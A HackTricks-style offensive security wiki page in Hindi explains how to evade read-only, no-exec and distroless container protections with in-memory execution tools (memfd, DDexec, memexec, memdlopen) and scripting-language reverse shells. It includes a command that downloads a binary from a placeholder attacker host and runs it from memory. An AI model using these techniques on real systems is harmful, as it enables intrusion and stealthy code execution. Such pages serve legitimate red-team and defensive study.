# FS protections को bypass करना: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Videos

निम्नलिखित videos में आप इस page पर बताई गई techniques को अधिक विस्तार से समझ सकते हैं:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Containers में **read-only (ro) file system protection** के साथ mounted Linux machines मिलना अधिक सामान्य होता जा रहा है। ऐसा इसलिए है क्योंकि container को ro file system के साथ चलाना `securitycontext` में **`readOnlyRootFilesystem: true`** सेट करने जितना आसान है:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

हालांकि, यदि file system को ro के रूप में mounted किया गया हो, तब भी **`/dev/shm`** writable रहेगा, इसलिए disk पर कुछ भी write न कर पाने की बात गलत है। हालांकि, यह folder **no-exec protection** के साथ **mounted** होगा, इसलिए यदि आप यहां कोई binary download करते हैं, तो आप उसे **execute नहीं कर पाएंगे**।

> [!WARNING]
> Red team के perspective से, इससे ऐसी binaries को **download और execute करना complicated हो जाता है** जो system में पहले से मौजूद नहीं हैं, जैसे backdoors या `kubectl` जैसे enumerators।

## सबसे आसान bypass: Scripts

ध्यान दें कि मैंने binaries का उल्लेख किया था। आप कोई भी script **execute कर सकते हैं**, जब तक उसका interpreter machine के अंदर मौजूद हो; जैसे `sh` मौजूद होने पर **shell script**, या `python` installed होने पर **python** **script**।

हालांकि, आपके binary backdoor या अन्य binary tools को execute करने के लिए यह पर्याप्त नहीं है।

## Memory Bypasses

यदि आप कोई binary execute करना चाहते हैं, लेकिन file system इसकी अनुमति नहीं दे रहा है, तो ऐसा करने का सबसे अच्छा तरीका उसे **memory से execute करना** है, क्योंकि **protections वहां लागू नहीं होतीं**।

### FD + exec syscall bypass

यदि machine के अंदर आपके पास कुछ powerful script engines हैं, जैसे **Python**, **Perl**, या **Ruby**, तो आप execute की जाने वाली binary को memory में download कर सकते हैं, उसे एक memory file descriptor (`create_memfd` syscall) में store कर सकते हैं, जो इन protections से protected नहीं होगा, और फिर **`exec` syscall** call कर सकते हैं, जिसमें **fd को execute की जाने वाली file** के रूप में indicate किया जाता है।

इसके लिए आप आसानी से [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project का उपयोग कर सकते हैं। आप इसे एक binary दे सकते हैं और यह indicated language में एक script generate करेगा, जिसमें **binary compressed और b64 encoded** होगी, साथ ही उसे **decode और decompress करने** के instructions होंगे। यह binary `create_memfd` syscall को call करके बनाए गए **fd** में store की जाएगी और उसे run करने के लिए **exec** syscall call किया जाएगा।

> [!WARNING]
> यह PHP या Node जैसी अन्य scripting languages में काम नहीं करता, क्योंकि उनके पास script से **raw syscalls call करने का कोई d**efault तरीका नहीं होता। इसलिए binary store करने के लिए **memory fd** बनाने हेतु `create_memfd` call करना संभव नहीं है।
>
> इसके अलावा, `/dev/shm` में file के साथ एक **regular fd** बनाने से भी काम नहीं चलेगा, क्योंकि आप उसे run नहीं कर पाएंगे और **no-exec protection** लागू होगी।

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) एक technique है, जो आपके अपने **process की memory** को उसके **`/proc/self/mem`** को overwrite करके **modify** करने की अनुमति देती है।

इसलिए, process द्वारा execute किए जा रहे **assembly code** को control करके, आप एक **shellcode** लिख सकते हैं और process को "mutate" करके **कोई भी arbitrary code execute** कर सकते हैं।

> [!TIP]
> **DDexec / EverythingExec** आपको अपने **shellcode** या **किसी भी binary** को **memory** से load और **execute** करने की अनुमति देगा।
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
इस technique के बारे में अधिक जानकारी के लिए Github देखें या:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec), DDexec का स्वाभाविक अगला चरण है। यह **DDexec shellcode demonised** है, इसलिए जब भी आपको **किसी अलग binary को run करना हो**, आपको DDexec को फिर से launch करने की आवश्यकता नहीं होती। आप केवल DDexec technique के माध्यम से memexec shellcode run कर सकते हैं और फिर **इस deamon से communicate करके load और run करने के लिए नई binaries भेज सकते हैं**।

आप [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) में **PHP reverse shell से binaries execute करने के लिए memexec का उपयोग करने** का एक उदाहरण देख सकते हैं।

### Memdlopen

DDexec के समान उद्देश्य के साथ, [**memdlopen**](https://github.com/arget13/memdlopen) technique बाद में execute करने के लिए **binaries को memory में load करने का एक आसान तरीका** प्रदान करती है। यह dependencies वाली binaries को भी load करने की अनुमति दे सकती है।

## Distroless Bypass

**Distroless वास्तव में क्या है**, यह कब उपयोगी होता है, कब नहीं होता, और containers में post-exploitation tradecraft को कैसे बदलता है, इसकी dedicated explanation के लिए देखें:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless क्या है

Distroless containers में **किसी specific application या service को run करने के लिए आवश्यक केवल bare minimum components** होते हैं, जैसे libraries और runtime dependencies, लेकिन package manager, shell या system utilities जैसे बड़े components शामिल नहीं होते।

Distroless containers का लक्ष्य **अनावश्यक components को हटाकर containers की attack surface को कम करना** और exploit की जा सकने वाली vulnerabilities की संख्या को न्यूनतम करना है।

### Reverse Shell

Distroless container में regular shell प्राप्त करने के लिए आपको **`sh` या `bash` भी नहीं मिल सकते**। आपको `ls`, `whoami`, `id` जैसी binaries भी नहीं मिलेंगी... यानी वे सभी चीज़ें जिन्हें आप सामान्यतः किसी system में run करते हैं।

> [!WARNING]
> इसलिए, आप सामान्य तरीके से **reverse shell** प्राप्त नहीं कर पाएंगे या system को **enumerate** नहीं कर पाएंगे।

हालांकि, यदि compromised container उदाहरण के लिए Flask web चला रहा है, तो Python installed होगा और इसलिए आप **Python reverse shell** प्राप्त कर सकते हैं। यदि वह Node चला रहा है, तो आप Node rev shell प्राप्त कर सकते हैं, और यही बात लगभग किसी भी **scripting language** पर लागू होती है।

> [!TIP]
> Scripting language का उपयोग करके आप उसकी capabilities से **system को enumerate** कर सकते हैं।

यदि **`read-only/no-exec`** protections नहीं हैं, तो आप अपने reverse shell का दुरुपयोग करके **file system में अपनी binaries write** कर सकते हैं और उन्हें **execute** कर सकते हैं।

> [!TIP]
> हालांकि, इस प्रकार के containers में ये protections आमतौर पर मौजूद होती हैं, लेकिन आप **previous memory execution techniques का उपयोग करके उन्हें bypass** कर सकते हैं।

आप [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) में **कुछ RCE vulnerabilities को exploit करके scripting languages के reverse shells प्राप्त करने** और memory से binaries execute करने के **examples** देख सकते हैं।


{{#include ../../../../banners/hacktricks-training.md}}
